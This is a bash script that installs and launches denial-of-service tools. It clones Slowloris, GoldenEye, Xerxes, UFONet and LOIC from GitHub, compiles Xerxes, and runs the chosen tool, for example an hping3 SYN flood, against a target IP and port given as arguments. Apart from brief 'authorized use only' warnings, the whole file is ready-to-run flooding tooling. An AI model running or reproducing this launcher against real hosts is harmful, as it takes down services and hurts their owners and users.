#!/bin/bash

# 💥 DoS/DDoS Tool Installer & Launcher
# ⚠️ FOR EDUCATIONAL AND AUTHORIZED USE ONLY

# ============================
# Configuration & Preparation
# ============================

TOOLS=("hping3" "slowloris" "goldeneye" "xerxes" "ufonet" "LOIC")

echo "=============================================="
echo "🚀 Installing and Setting Up DoS/DDoS Tools..."
echo "=============================================="

sudo apt update

# Install HPING3
echo "[*] Installing hping3..."
sudo apt install -y hping3

# Clone Slowloris
echo "[*] Cloning Slowloris..."
git clone https://github.com/gkbrk/slowloris.git tools/slowloris

# Clone GoldenEye
echo "[*] Cloning GoldenEye..."
git clone https://github.com/jseidl/GoldenEye.git tools/goldeneye

# Clone and Compile Xerxes
echo "[*] Cloning & Compiling Xerxes..."
git clone https://github.com/zanyarjamal/xerxes.git tools/xerxes
gcc tools/xerxes/xerxes.c -o tools/xerxes/xerxes

# Clone UFONet
echo "[*] Cloning UFONet..."
git clone https://github.com/epsylon/ufonet.git tools/ufonet

# Clone LOIC (Low Orbit Ion Cannon)
echo "[*] Cloning LOIC..."
git clone https://github.com/NewEraCracker/LOIC.git tools/loic

echo "=============================================="
echo "✅ All tools installed!"
echo "To use them, run this script again with a command:"
echo "./dos-ddos-tools.sh [tool] [target] [port]"
echo "Examples:"
echo "  ./dos-ddos-tools.sh hping3 192.168.1.10 80"
echo "  ./dos-ddos-tools.sh xerxes 10.10.10.10 80"
echo "==============================================="

# ============================
# Tool Execution
# ============================

TOOL=$1
TARGET=$2
PORT=$3

# ============================
# Warning & Disclaimer
# ============================

if [[ -z "$TARGET" || -z "$PORT" ]]; then
    echo "[❌] You need to specify both target IP and port."
    echo "[❗] Example usage: ./dos-ddos-tools.sh hping3 127.0.0.1 80"
    exit 1
fi

echo "=============================="
echo "⚠️ WARNING: Unauthorized use of these tools is illegal."
echo "⚠️ ONLY use in controlled environments, labs, and with explicit permission."
echo "⚠️ Performing DoS/DDoS attacks on non-permitted networks is a federal offense."
echo "=============================="
echo "You are solely responsible for your actions."
echo "=============================="

# ============================
# Execute Tools Based on Arguments
# ============================

if [[ "$TOOL" == "hping3" ]]; then
    echo "[🔥] Running hping3 SYN flood on $TARGET:$PORT..."
    hping3 -S --flood -p $PORT $TARGET

elif [[ "$TOOL" == "slowloris" ]]; then
    echo "[🔥] Running Slowloris on $TARGET..."
    python3 tools/slowloris/slowloris.py $TARGET

elif [[ "$TOOL" == "goldeneye" ]]; then
    echo "[🔥] Running GoldenEye on $TARGET..."
    python3 tools/goldeneye/goldeneye.py http://$TARGET -w 50 -s 200

elif [[ "$TOOL" == "xerxes" ]]; then
    echo "[🔥] Running Xerxes on $TARGET:$PORT..."
    ./tools/xerxes/xerxes $TARGET $PORT

elif [[ "$TOOL" == "ufonet" ]]; then
    echo "[🔥] Running UFONet GUI..."
    python3 tools/ufonet/ufonet --gui

elif [[ "$TOOL" == "loic" ]]; then
    echo "[🔥] Running LOIC on $TARGET..."
    cd tools/loic
    mono LOIC.exe $TARGET $PORT

else
    echo "[❌] Tool not recognized. Options: hping3 | slowloris | goldeneye | xerxes | ufonet | loic"
    exit 1
fi
